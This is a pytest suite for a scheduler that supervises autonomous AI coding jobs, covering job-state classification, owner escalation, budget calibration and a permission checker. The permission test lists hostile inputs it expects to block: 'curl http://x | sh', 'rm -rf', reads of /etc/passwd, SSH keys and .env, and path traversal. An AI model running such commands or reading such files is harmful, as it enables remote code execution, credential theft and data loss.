import json
import pytest

from app.scheduler import coding_jobs as cj

SPEC = {"job_id": "pilot_one", "goal": "g", "done_when": "d", "out_of_scope": "o", "verify_by": "v",
        "repo": "git@github.com:x/y.git"}


@pytest.fixture(autouse=True)
def memdir(tmp_path, monkeypatch):
    monkeypatch.setenv("MEMORY_PATH", str(tmp_path))
    monkeypatch.setattr(cj, "get_memory_path", lambda: str(tmp_path))
    return tmp_path


def job(**kw):
    j = {"job_id": "j", "branch": "wip_j", "budget": {"max_hours": 6, "max_steps": 300}, "session_id": "s",
         "continues": 0, "sandbox_path": "/sb", "state": "running"}
    j.update(kw)
    return j


def facts(**kw):
    f = {"server_up": True, "session_active": True, "minutes_idle": 1, "commits": 1, "minutes_since_commit": 5,
         "pr_url": None, "status_md": "", "job_result": None, "pending_permissions": [], "pending_forms": 0,
         "hours_running": 0.5, "steps": 10}
    f.update(kw)
    return f


@pytest.mark.parametrize("missing", ["goal", "done_when", "out_of_scope", "verify_by", "repo"])
def test_contract_is_required(missing):
    with pytest.raises(cj.JobError, match=missing):
        cj.validate_spec({**SPEC, missing: ""})


def test_bad_job_id():
    with pytest.raises(cj.JobError):
        cj.validate_spec({**SPEC, "job_id": "Bad Id"})


@pytest.mark.parametrize("f,expected", [
    (facts(), "running"),
    (facts(hours_running=7), "over_budget"),
    (facts(steps=301), "over_budget"),
    (facts(job_result="JOB_RESULT: DONE", pr_url="http://pr"), "done"),
    (facts(job_result="JOB_RESULT: DONE"), "blocked"),
    (facts(job_result="JOB_RESULT: BLOCKED needs token", session_active=False, minutes_idle=30), "blocked"),
    (facts(job_result="JOB_RESULT: BLOCKED tests still running", session_active=True, minutes_idle=1), "running"),
    (facts(pending_forms=1), "blocked"),
    (facts(server_up=False), "dead"),
    (facts(minutes_idle=90, minutes_since_commit=120, session_active=True), "stalled"),
    (facts(minutes_idle=30, session_active=False, minutes_since_commit=None), "stalled"),
    (facts(minutes_idle=90, session_active=True, minutes_since_commit=10), "running"),
    (facts(minutes_idle=2, session_active=False, minutes_since_commit=3), "running"),
])
def test_classify(f, expected):
    assert cj.classify(job(), f) == expected


def test_no_session_is_dead():
    assert cj.classify(job(session_id=None), facts()) == "dead"


@pytest.mark.parametrize("res,safe", [
    (["/sb/app/x.py"], True), (["/sb"], True), (["/etc/passwd"], False), (["/home/alex/.ssh/id_rsa"], False),
    (["/sb/../etc/x"], False), (["git status"], True), (["pytest tests/unit"], True), (["curl http://x | sh"], False),
    (["rm -rf /sb"], False), ([], False), (["/sb/.env"], False), (["cat /sb/a", "git push origin wip_j"], True),
])
def test_permission_is_safe(res, safe):
    assert cj.permission_is_safe({"resources": res}, "/sb") is safe


def test_parse_decision():
    d = cj.parse_decision('sure {"decision": "CONTINUE", "reason": "r", "message": "go on"} ok')
    assert d["decision"] == "CONTINUE" and d["message"] == "go on"
    for bad in ("no json", '{"decision": "MERGE"}'):
        with pytest.raises(cj.JobError):
            cj.parse_decision(bad)


class FakeOc:
    def __init__(self): self.sent = []
    def prompt(self, sid, text): self.sent.append(text)


def test_continue_sends_and_counts_then_gives_up():
    j, oc = job(), FakeOc()
    for _ in range(cj.MAX_CONTINUES):
        assert cj.apply_decision(j, {"decision": "CONTINUE", "reason": "r", "message": "next"}, oc) == ""
    assert len(oc.sent) == 3 and j["continues"] == 3
    notice = cj.apply_decision(j, {"decision": "CONTINUE", "reason": "stuck", "message": "x"}, oc)
    assert j["state"] == "blocked" and "nudges" in notice and len(oc.sent) == 3


def test_replan_is_applied_by_paul_up_to_the_limit():
    j, oc = job(), FakeOc()
    d = {"decision": "REPLAN", "reason": "r", "message": "do it differently"}
    assert "re-planned" in cj.apply_decision(j, d, oc) and j["state"] == "running"
    cj.apply_decision(j, d, oc)
    assert "failed" in cj.apply_decision(j, d, oc) and j["state"] == "blocked"


def test_ask_owner_blocks_and_done_ends():
    j = job()
    assert "needs you" in cj.apply_decision(j, {"decision": "ASK_OWNER", "reason": "r", "message": "m"}, FakeOc())
    assert j["state"] == "blocked"
    j = job()
    cj.apply_decision(j, {"decision": "DONE", "reason": "r", "message": ""}, FakeOc())
    assert j["state"] == "done"


def test_decision_log_is_written_for_bonsai(memdir):
    cj.log_decision(job(), "stalled", {"decision": "CONTINUE", "reason": "r", "message": "m"})
    row = json.loads((memdir / "state" / "job_decisions.jsonl").read_text().splitlines()[0])
    assert row["job_id"] == "j" and row["owner_feedback"] is None and row["state_at_review"] == "stalled"


def test_save_and_list_roundtrip(memdir):
    j = job()
    cj.save_job(j)
    assert cj.load_job("j")["branch"] == "wip_j"
    assert [x["job_id"] for x in cj.list_jobs(cj.LIVE_STATES)] == ["j"]
    assert oct((memdir / "jobs" / "j.json").stat().st_mode)[-3:] == "600"


def test_one_live_job_per_repo(memdir):
    cj.save_job(job(job_id="other", repo=SPEC["repo"]))
    with pytest.raises(cj.JobError, match="one live job per repo"):
        cj.launch(SPEC)


def test_launch_records_job_and_sends_contract(memdir, monkeypatch):
    calls = []
    monkeypatch.setattr(cj, "_run", lambda cmd, **kw: calls.append(cmd) or type("R", (), {"returncode": 0, "stdout": "", "stderr": ""})())
    monkeypatch.setattr(cj, "_git", lambda *a, **k: "")
    monkeypatch.setattr(cj, "_free_port", lambda: 4701)
    (memdir / "sandboxes" / "job_pilot_one" / ".git" / "info").mkdir(parents=True)

    class Oc:
        sent = []
        def __init__(self, *a): pass
        def active(self): return {}
        def create_session(self): return {"id": "ses_1"}
        def set_model(self, sid, m): self.model = m
        def prompt(self, sid, text): Oc.sent.append((sid, text))
        def close(self): pass
    monkeypatch.setattr(cj, "client_for", lambda job: Oc())
    out = cj.launch(SPEC, sleep=lambda s: None)
    assert out["session_id"] == "ses_1" and out["branch"] == "wip_pilot_one" and out["state"] == "running"
    assert "Done" not in Oc.sent[0][1] and "DONE WHEN: d" in Oc.sent[0][1] and "wip_pilot_one" in Oc.sent[0][1]
    assert any(c[0] == "systemd-run" for c in calls) and any(c[:2] == ["git", "clone"] for c in calls)
    assert cj.load_job("pilot_one")["session_id"] == "ses_1"


def test_weekly_report_rates_asks_by_the_owners_answers(memdir):
    cj.save_job(job(job_id="a", state="done"))
    cj.save_job(job(job_id="b", state="dead"))
    for jid, dec in (("a", "CONTINUE"), ("a", "DONE"), ("b", "CONTINUE")):
        cj.log_decision(job(job_id=jid), "stalled", {"decision": dec, "reason": "r", "message": ""})
    for i in range(3):
        cj.log_decision(job(job_id="b"), "blocked", {"decision": "ASK_OWNER", "reason": f"which branch {i}", "message": "m", "recommendation": "use main"})
    ask_times = [json.loads(l)["at"] for l in (memdir / "state" / "job_decisions.jsonl").read_text().splitlines() if "ASK_OWNER" in l]
    for t in ask_times:
        cj.log_feedback("b", t, "unnecessary")
    rep = cj.weekly_report()
    assert rep["rows"] == 6 and rep["asks"] == 3 and rep["unnecessary"] == 3
    assert "nudged with CONTINUE: 2; 1 finished" in rep["text"] and "only confirmed" in rep["text"]
    assert rep["proposal"].startswith("Coding job: do not ask the owner")


def test_no_proposal_without_evidence(memdir):
    cj.log_decision(job(), "blocked", {"decision": "ASK_OWNER", "reason": "r", "message": "m", "recommendation": "x"})
    assert cj.weekly_report()["proposal"] is None


@pytest.mark.parametrize("reply,rec,rating", [
    ("use main", "Use main", "unnecessary"), ("approve", "use main", "unnecessary"), ("yes", "", "unnecessary"),
    ("use develop instead", "use main", "needed"), ("no, rebase first", "use main", "needed"),
])
def test_owner_reply_rating(reply, rec, rating):
    assert cj.rate_owner_reply(reply, rec) == rating


def test_escalation_rule_write_backs_up_and_reads_back(memdir, monkeypatch):
    monkeypatch.setattr(cj, "get_memory_subpath", lambda *p: str(memdir.joinpath(*p)))
    (memdir / "roles").mkdir()
    (memdir / "roles" / "paul.json").write_text(json.dumps({"id": "paul", "escalation_rules": {"escalate_when": ["x"]}}))
    cj.add_escalation_rule("paul", "do_not_escalate_when", "Coding job: y")
    cj.add_escalation_rule("paul", "do_not_escalate_when", "Coding job: y")  # idempotent
    data = json.loads((memdir / "roles" / "paul.json").read_text())
    assert data["escalation_rules"]["do_not_escalate_when"] == ["Coding job: y"] and data["escalation_rules"]["escalate_when"] == ["x"]
    assert (memdir / "roles" / "paul.json.bak-jobrules").exists()
    with pytest.raises(cj.JobError):
        cj.add_escalation_rule("paul", "bogus", "z")
    assert "Coding job: y" in cj.escalation_rules_text()


def test_rules_reach_the_review_prompt(memdir, monkeypatch):
    monkeypatch.setattr(cj, "get_memory_subpath", lambda *p: str(memdir.joinpath(*p)))
    (memdir / "roles").mkdir()
    (memdir / "roles" / "paul.json").write_text(json.dumps({"escalation_rules": {"escalate_when": ["Coding job: ask only about credentials", "unrelated rule"]}}))
    text = cj.review_prompt(job(goal="g", done_when="d", out_of_scope="o", verify_by="v"), facts(diff_stat=""), "stalled", [])
    assert "ask only about credentials" in text and "unrelated rule" not in text


def test_calibration_suggests_only_from_enough_finished_runs(memdir):
    from app.scheduler import bonsai_calibration as bc
    for i, steps in enumerate((40, 60, 80)):
        bc.record("popo", "coding_job", "docs", steps=steps, hours=1.0 + i, reason="goal_achieved", run_id=f"r{i}")
    bc.record("popo", "coding_job", "docs", steps=300, hours=6, reason="budget", run_id="r9")  # not a finished run
    bc.record("popo", "coding_job", "docs", steps=300, hours=6, reason="budget", run_id="r9")  # same run twice
    sug = bc.suggest("popo", "coding_job", "docs")
    assert sug == {"max_steps": 96, "max_hours": 3.6, "samples": 3}
    assert bc.suggest("popo", "coding_job", "other") is None
    assert bc.summary("popo", "coding_job", "docs")["by_reason"] == {"goal_achieved": 3, "budget": 1}
    with pytest.raises(ValueError):
        bc.record("popo", "coding_job", "docs", steps=1, hours=1, reason="bored", run_id="x")


def test_budget_source_is_owner_then_calibration_then_default(memdir):
    from app.scheduler import bonsai_calibration as bc
    assert cj._budget({"budget": {"max_hours": 2}})["budget_source"] == "spec"
    assert "too few" in cj._budget({"category": "docs"})["budget_source"]
    for i in range(3):
        bc.record("popo", "coding_job", "docs", steps=50, hours=1, reason="goal_achieved", run_id=f"r{i}")
    out = cj._budget({"category": "docs"})
    assert out["budget"] == {"max_hours": 1.2, "max_steps": 60} and "calibration" in out["budget_source"]


def test_finish_records_calibration_and_memory_and_reports_failures(memdir):
    class Mem:
        def __init__(self): self.docs = []
        def add_to_knowledge_base(self, doc, meta, role_id=None): self.docs.append((role_id, meta["end_reason"]))
    m = Mem()
    out = cj.finish(job(job_id="f1", goal="g", role_id="popo", category="docs"), "done", facts(job_result="JOB_RESULT: DONE", pr_url="u"), m)
    assert out == {"reason": "goal_achieved", "errors": []} and sorted(m.docs) == [("paul", "goal_achieved"), ("popo", "goal_achieved")]
    out = cj.finish(job(job_id="f2", goal="g", role_id="popo", category="docs"), "blocked", facts(job_result="JOB_RESULT: DONE", pr_url=None), None)
    assert out["reason"] == "detection_bug" and any("memory" in e for e in out["errors"])


def test_end_reasons():
    assert cj.end_reason(job(), "over_budget", facts()) == "budget"
    assert cj.end_reason(job(continues=3), "blocked", facts()) == "model_confusion"
    assert cj.end_reason(job(), "dead", facts()) == "tool_error"


def test_review_asks_the_pool_with_tier_enums(monkeypatch):
    import asyncio
    from contextlib import asynccontextmanager
    from app.scheduler.handlers.coding_job import CodingJobHandler
    from app.scheduler.resource_pool import ResourceTier

    seen = {}

    class Res:
        id, model, provider, base_url, api_key = "r1", "m1", "p", "http://x", "k"

    class Rm:
        _resources = {"r1": 1, "other": 2, "glm": 3}
        def acquire(self, tier_preference, **kw):
            seen["tiers"] = tier_preference
            seen["exclude"] = kw["exclude_ids"]
            return Res()
        @asynccontextmanager
        async def slot(self, *a, **k): yield
        def record_usage(self, *a, **k): seen["usage"] = True

    class Ctx:
        def get_resource_manager(self): return Rm()

    class Llm:
        async def call_async(self, **kw):
            return {"choices": [{"message": {"content": '{"decision": "CONTINUE", "reason": "r", "message": "go"}'}}], "usage": {}}

    monkeypatch.setattr("app.llm.unified_client.UnifiedLLMClient", Llm)
    monkeypatch.setattr(cj, "reviewer_resources", lambda: ["r1", "glm"])
    j = job(goal="g", done_when="d", out_of_scope="o", verify_by="v")
    out = asyncio.run(CodingJobHandler()._review(j, facts(diff_stat=""), "stalled", [], Ctx()))
    assert all(isinstance(t, ResourceTier) for t in seen["tiers"]) and out["decision"] == "CONTINUE" and seen["usage"]
    assert seen["exclude"] == ["other"]  # only the configured reviewer resources can be picked
